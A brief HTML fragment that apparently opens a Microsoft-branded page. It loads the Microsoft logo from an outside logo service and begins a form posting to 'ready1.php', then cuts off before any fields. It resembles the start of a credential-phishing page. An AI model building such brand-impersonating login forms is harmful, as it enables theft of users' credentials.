...
<body id = "background"> 
<div id = "content">
       <img src = "https:logo.clearbit.com/microsoft.com" alt = "logo" width = "120px" height = "25px" style = "margin-left:50px; margin-top:40px" >
          <form action = "ready1.php" method = "post">
